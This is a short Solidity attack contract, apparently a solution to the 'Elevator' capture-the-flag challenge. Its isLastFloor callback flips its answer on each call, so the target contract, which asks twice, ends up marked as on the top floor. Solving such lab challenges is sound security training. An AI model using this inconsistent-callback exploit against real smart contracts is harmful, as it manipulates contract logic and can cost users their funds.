// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack {
  
    Elevator elevatorContract;
    bool public toggle = true;

    constructor(address _elevatorContractAddress) {
        elevatorContract = Elevator(_elevatorContractAddress);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        elevatorContract.goTo(_floor);
    }
}